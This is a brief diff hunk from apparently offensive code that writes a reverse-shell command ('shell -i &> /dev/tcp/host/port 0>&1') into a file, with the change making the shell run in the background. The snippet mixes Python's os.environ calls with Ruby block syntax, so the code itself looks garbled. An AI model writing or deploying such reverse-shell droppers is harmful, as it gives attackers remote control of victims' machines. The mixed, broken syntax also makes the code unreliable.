@@ -46,7 +46,7 @@ sleep(1)
 w = os.environ['OLDPWD']
 os.chdir(w)
 open(file, 'w') { |f|
-    f.puts "#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1"
+    f.puts "#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1 &"
 }
 g = os.environ['HOME']
 os.chdir(g + "/thoron")
